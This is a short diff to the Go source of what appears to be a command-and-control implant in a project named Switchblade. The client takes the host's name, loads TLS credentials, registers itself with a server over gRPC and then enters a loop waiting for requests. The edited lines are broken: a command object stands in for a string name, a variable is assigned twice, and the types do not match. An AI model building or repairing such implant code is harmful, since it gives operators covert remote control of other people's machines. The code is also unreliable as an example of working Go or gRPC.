@@ -13,7 +13,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/matt-culbert/Switchblade/grcpapi/implant.proto"
+	"github.com/matt-culbert/Switchblade/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 )
@@ -57,7 +57,9 @@ func main() {
 
 	var name = exec.Command("hostname") // generate a client name on first launch
 
-	whoami.Register = name // register is defined in proto as a string
+	iam = whoami.Register // register is defined in proto as a string
+
+	iam = name
 
 	tlsCredentials, err := loadTLSCredentials()
 	if err != nil {
@@ -73,7 +75,7 @@ func main() {
 	ctx := context.Background()
 
 	client = grpcapi.NewImplantClient(conn)
-	client.RegisterImplant(ctx, whoami) // RegisterImplant is defined in proto as taking in a string and has no output
+	client.RegisterImplant(ctx, iam) // RegisterImplant is defined in proto as taking in a string and has no output
 
 	for {
 		var req = new(grpcapi.Empty)
